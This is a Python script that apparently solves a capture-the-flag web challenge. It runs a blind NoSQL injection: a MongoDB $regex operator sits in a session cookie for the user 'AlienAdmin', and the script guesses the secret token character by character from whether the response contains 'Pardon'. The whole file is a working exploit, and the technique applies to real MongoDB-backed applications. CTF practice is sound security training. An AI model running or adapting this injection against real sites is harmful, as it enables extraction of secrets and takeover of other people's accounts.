import requests
import string

URL="https://area51.chall.pwnoh.io"

def guess_admin_password():
    print("Starting...")
    
    username = guess()


def guess():
    headers = {'Content-type': 'application/x-www-form-urlencoded;charset=UTF-8'}

    cur_guess = "bctf{"
    for i in range(100): # max = 100
        print(cur_guess)
        found = False
        for c in string.ascii_uppercase + string.ascii_lowercase + string.digits + '{_}':
            #print(f"trying {c}...")
            session = '{ "token": { "$regex": "^' + cur_guess + c + '" }, "username": "AlienAdmin"}'
            r = requests.get(URL, headers=headers, cookies={'session': session})

            if "Pardon" in r.text:
                cur_guess+=c
                print(cur_guess)
                if '}' in cur_guess:
                    return
                found = True
                break

        if not found:
            break
    return cur_guess

guess_admin_password()
